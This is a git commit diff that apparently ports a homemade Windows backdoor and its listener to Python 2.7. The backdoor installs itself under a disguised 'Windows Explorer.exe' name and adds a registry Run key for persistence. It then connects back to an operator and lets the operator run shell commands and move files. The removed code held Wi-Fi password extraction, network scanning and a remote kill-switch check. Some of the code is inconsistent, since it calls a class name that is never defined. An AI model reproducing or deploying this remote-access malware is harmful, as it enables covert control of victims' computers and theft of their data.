dd68af7d0000c7d54e27d44521c859a2a63f479d
numberx <shekooha696@gmail.com>
2022-02-11 21:15:27 +0330

    downgraded to python 2.7

--- package/backdoor/Server.py
+++ package/backdoor/Server.py
@@ -1,156 +1,76 @@
-#!/usr/bin/env python3
-"""
-change server name  to main.py
-serve it as file and start the handler wich has custom code exec
-needs to be debuged
-ssh clients needs to be planted in reg or startup
-"""
-from email.mime import base
-from urllib.request import urlopen
-import urllib
+#!/usr/bin/env python2.7
 import socket
 import subprocess
 import json
 import os
-import sys
 import base64
 import sys
 import shutil
-import re
-import scapy.all as scapy
-from time import sleep
 import requests
+
+IP = "" # change this
+PORT = 80 # change this (Integer Only)
 class MotherFucker():
     def __init__(self, ip, port):
         self.persistence()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
+    
     def persistence(self):
         location = os.environ["appdata"] + "\\Windows Explorer.exe"
         if not os.path.exists(location):
             shutil.copyfile(sys.executable, location)
             subprocess.call('reg add HKCU\Software\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + location + '"' , shell=True)
-    def check_status(self):
-        pass
 
-    def cmd_send(self, data):
+    def json_send(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data)
+
+    def json_recv(self):
+        json_data = ""
         while True:
             try:
-                json_send = json.dumps(data).encode()
-                self.connection.send(json_data)
-            except Exception as e:
-                print (e)
-    def cmd_recv(self): 
-        json_recived = ""
-        while True:
-            try:
-                json_recived += self.connection.recv(1024)
-                data = json.loads(json_recived).strip().decode('utf8')
-                return data
-            except ValueError as v:
-              #  print(v)
+                json_data += self.connection.recv(1024)
+                return json.loads(json_data)
+            except ValueError:
                 continue
-    def change_dir(self, path):
+
+    def change_working_dir(self, path):
         os.chdir(path)
         return "Changed dir to %s" % path
-    def upload_file(self, path, content):
-        with open(path, "wb") as file:
-            uploaded_file = base64.b64decode(content)
-            file.write(uploaded_file)
-            return "Uploaded Succesfully !"
-    def download_file(self, path):
-        with open(path, "rb") as file:
-            download_file = base64.b64encode(file.read())
-            return download_file
-    def exec_command(self, command):
-        return subprocess.check_output(command, shell=True)
-    def get_ip():
-        data = str(urlopen('http://checkip.dyndns.com/').read())
-        ip = socket.gethostbyname(socket.gethostname())
-        private = ip
-        pub = re.compile(r'Address: (\d+.\d+.\d+.\d+)').search(data).group(1)
-        return f"Private ip of the machine is {private}\nPublic ip of the machine is {pub}", private, pub
-    def get_wifi():
-        # wifi clear pass
-        data = os.popen("netsh wlan show profiles").read()
-        wifi = re.compile("All User Profile\s*:.(.*)")
-        ssid = wifi.findall(data)
-        try:
-            wlan = subprocess.Popen("netsh wlan show profile "+str(ssid.replace(" ","*"))+" key=clear").read()
-            pass_regex = re.compile("Key Content\s*:.(.*)")
-            return pass_regex.search(wlan).group(1)
-        except Exception:
-            return " "
-    def arp_scan(self):
-        # scans the entire network
-        ip = self.get_ip.private
-        arp_request = scapy.ARP(pdst=ip)
-        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-        arp_request_broadcast = broadcast / arp_request
-        answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
-        machines = []
-        for i in answered_list:
-            machine_dict = {"ip": i[1].psrc, "mac": i[1].hwsrc}
-            machines.append(machine_dict)
-        return machines
-    def port_scan(self, ip):
-        target = ip
-        data = ""
-        try:
-            for port in range(1,65535):
-                s = socket.socket((socket.AF_INET,socket.SOCK_STREAM))
-                socket.setdeafulttimeout(1)
-                result = s.connect_ex((target,port))
-                if result == 0:
-                    data += f"---\tIP {target}\n\n\t{port} is open"
-                s.close()
-        except KeyboardInterrupt:
-            data += "\nKeyboard Intrupted ."
-            pass
-        except socket.gaierror:
-            data += f"\nCould not Resolve IP : {target}"
-            sys.exit()
-        except socket.error:
-            data += f"\n Server not Working ..."
-            sys.exit()
-        return data
-    def scan_result(self):
-        result = ""
-        for host in self.arp_scan:
-            result += self.port_scan(host)
-        encoded_result = base64.b64encode(result)
-        return encoded_result
 
+    def write_file(self, path, content):
+        with open(path, "wb") as file:
+            decoded_file = base64.b64decode(content)
+            file.write(decoded_file)
+            return "Uploaded Succesfully !"
+
+    def read_file(self, path):
+        with open(path, "rb") as file:
+            encoded_file = base64.b64encode(file.read())
+            return encoded_file
+
+    def execute_system_command(self, command):
+        return subprocess.check_output(command, shell=True)
 
     def run(self):
         while True:
-            rcvd_cmd = self.cmd_recv()
-            print(rcvd_cmd)
+            rcvd_cmd = self.json_recv()
             try:
                 if rcvd_cmd[0] == "exit":
                     self.connection.close()
-                    sys.exit()
+                    sys.exit() 
                 elif rcvd_cmd[0] == "cd" and len(rcvd_cmd) > 1:
-                    cmd_rslt = self.change_dir(rcvd_cmd[1])
+                    cmd_rslt = self.change_working_dir(rcvd_cmd[1])
                 elif rcvd_cmd[0] == "download":
-                    cmd_rslt = self.download_file(rcvd_cmd[1])
+                    cmd_rslt = self.read_file(rcvd_cmd[1])
                 elif rcvd_cmd[0] == "upload":
-                    cmd_rslt = self.upload_file(rcvd_cmd[1], rcvd_cmd[2])
-                elif rcvd_cmd[0] == "getip":
-                    cmd_rslt = self.get_ip
-                elif rcvd_cmd[0] ==  "scan":
-                    cmd_rslt = self.scan_result
-                elif rcvd_cmd[0] == "get_wifi":
-                    cmd_rslt = self.get_wifi
-                
+                    cmd_rslt = self.write_file(rcvd_cmd[1], rcvd_cmd[2])
                 else:
-                    cmd_rslt = self.exec_command(rcvd_cmd)
-                
-            except Exception as e :
-                    cmd_rslt = f"[-] Error During Command Execution.\n ERROR:\t{e}\t"
-                    print(cmd_rslt)
-            self.cmd_send(cmd_rslt)
-
+                    cmd_rslt = self.execute_system_command(rcvd_cmd)
+            except Exception:
+                cmd_rslt = "[-] Error During Command Execution."
+            self.json_send (cmd_rslt)
 def get_status():
     s = requests.get('https://poggerpussy.github.io').text
     #status = re.sub(r"<.*?>",'', s)
@@ -160,11 +80,9 @@ def get_status():
 
 
 
-while True:
-    try:
-        if get_status:
-            app = MotherFucker("192.168.1.31", 80)
-            app.run()
-    except Exception as e:
-        print(e)
-        pass
+
+try:
+    jja213415 = Backdoor(IP, PORT)
+    jja213415.run()
+except Exception:
+    sys.exit()
--- package/listener/handler.py
+++ package/listener/handler.py
@@ -1,13 +1,12 @@
-#!/usr/bin/env python3
-from email.mime import base
-from os import stat
-import socket
-import json
-import base64
-import sys
-import requests
-import re
-class Listener():
+#!/usr/bin/env python2.7
+import socket, json, base64
+
+
+IP = "" # change this
+PORT = 80 # change this (Integer Only)
+
+
+class Listener:
     def __init__(self, ip, port):
         listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -18,82 +17,51 @@ class Listener():
         print("[+] Connection Established at [ %s ]" % str(self.address))
 
     def json_send(self, data):
-        print(data)
-        json_data = json.dumps(data).encode()
+        json_data = json.dumps(data)
         self.connection.send(json_data)
+
     def json_recv(self):
-        json_recived = ""
+        json_data = ""
         while True:
             try:
-                json_recived += self.connection.recv(1024)
-                data = json.loads(json_recived).strip().decode('utf8')
-                return data
-            except ValueError as v:
-                print(v)
+                json_data += self.connection.recv(1024)
+                return json.loads(json_data)
+            except ValueError:
                 continue
+
     def execute_remotely(self, command):
-        print(command)
         self.json_send(command)
         if command[0] == "exit":
             self.connection.close()
             exit()
         return self.json_recv()
 
-    def download_file(self, path, content):
+    def write_file(self, path, content):
         with open(path, "wb") as file:
             decoded_file = base64.b64decode(content)
             file.write(decoded_file)
             return "Downloaded [%s] Successfully ." % path
 
-    def upload_file(self, path):
+    def read_file(self, path):
         with open(path, "rb") as file:
             encoded_file = base64.b64encode(file.read())
             return encoded_file
-    def recv_scan_result(self, content):
-        scan_result = base64.b64decode(content)
-        if "Keyboard" and "Resolve" and "Server" not in scan_result:
-            with open("scan_result.txt", "w") as f:
-                f.write(scan_result)
-                f.close()
-        print (scan_result)
 
     def run(self):
         while True:
-            c = input("> ").strip()
-            cmd = c.split(" ")
-            
+            cmd = raw_input("> ")
+            cmd = cmd.split(" ")
             try:
-                
                 if cmd[0] == "upload":
-                    file_content = self.upload_file(cmd[1])
+                    file_content = self.read_file(cmd[1])
                     cmd.append(file_content)
+                result = self.execute_remotely(cmd)
                 if cmd[0] == "download" and "[-] Error " not in result:
-                    result = self.download_file(cmd[1], result)
-                if cmd[0] == "scan":
-                    result = self.recv_scan_result(result)
-                result = self.execute_remotely(cmd[0])
-            except Exception as e:
-                result = f"[-] Error during command execution.\n\t {e}"
-
+                    result = self.write_file(cmd[1], result)
+            except Exception:
+                result = "[-] Error during command execution."
             print (result)
 
-def get_status():
-    s = requests.get('https://poggerpussy.github.io').text
-    #status = re.sub(r"<.*?>",'', s)
-    if s == "true":
-        print(s)
-        return True
-    return False
 
-
-try:
-    if get_status:
-        app = Listener("0.0.0.0", 80)
-        app.run()            
-except Exception as e:
-    print(e)
-    pass
-except KeyboardInterrupt:
-    print ("Exiting program")
-    sys.exit()
-
+app = Listener(IP, PORT)
+app.run()
